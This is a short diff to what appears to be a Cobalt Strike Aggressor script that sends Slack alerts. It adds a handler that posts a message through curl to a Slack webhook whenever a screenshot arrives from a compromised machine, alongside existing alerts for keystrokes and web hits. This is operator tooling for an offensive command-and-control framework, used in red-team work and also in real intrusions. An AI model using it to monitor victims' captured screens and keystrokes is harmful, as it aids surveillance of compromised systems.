@@ -12,6 +12,7 @@ $slack_emoji_info = ':information_source:';
 $slack_emoji_message = ':memo:';
 $slack_emoji_keystrokes = ':bomb:';
 $slack_emoji_site = ':construction_worker:';
+$slack_emoji_screenshot = ':eyes:';
 $active_users = "";
     	
 # csusersinfo function
@@ -86,4 +87,13 @@ on keystrokes {
 on web_hit {
 	@curl_command = @('curl','-X','POST','--data-urlencode','payload={"username": "Cobalt Strike Slack Bot", "channel": "' . $slack_channel . '", "text":"'.$slack_emoji_web_hit.' New Web hit!\n\n'.$slack_emoji_info.' Web Log details:\n\nFrom: '.$3.'\nRequest: '.$1.' '.$2.'\nResponse: '.$5.'\nUser-Agent: '.$4.'"}',$slack_webhookURL);
 	exec(@curl_command);
+}
+
+# New Screenshot Alert
+on screenshots {
+	$screenuser = $1['user'];
+	$screentitle = $1['title'];
+
+	@curl_command = @('curl', '-X', 'POST', '--data-urlencode', 'payload={"username": "Cobalt Strike Slack Bot", "channel": "' . $slack_channel . '", "text":"'.$slack_emoji_screenshot.' Received new screenshot of '.$screentitle.' by '.$screenuser.'!"}', $slack_webhookURL);
+    exec(@curl_command);
 }
